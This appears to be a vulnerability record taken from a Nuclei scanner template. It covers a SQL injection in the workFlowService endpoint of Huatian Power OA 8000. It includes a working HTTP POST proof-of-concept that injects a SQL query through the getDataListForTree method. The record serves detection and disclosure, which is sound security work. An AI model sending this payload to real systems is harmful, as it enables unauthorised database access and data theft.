# Nuclei Template: Huatian Power OA 8000 workFlowService - SQL injection
**Template ID:** huatian-oa8000-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`huatian-oa8000-sqli.yaml`)

## Vulnerability Information & PoC

## Description
There is a SQL injection vulnerability in the workFlowService interface of Huatian Power OA 8000 version, through which an attacker can obtain sensitive database information

## Steps to reproduce / Exploit Payload
```http
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: {{Hostname}}

<buffalo-call>
<method>getDataListForTree</method>
<string>select user()</string>
</buffalo-call>
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E5%8D%8E%E5%A4%A9OA/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
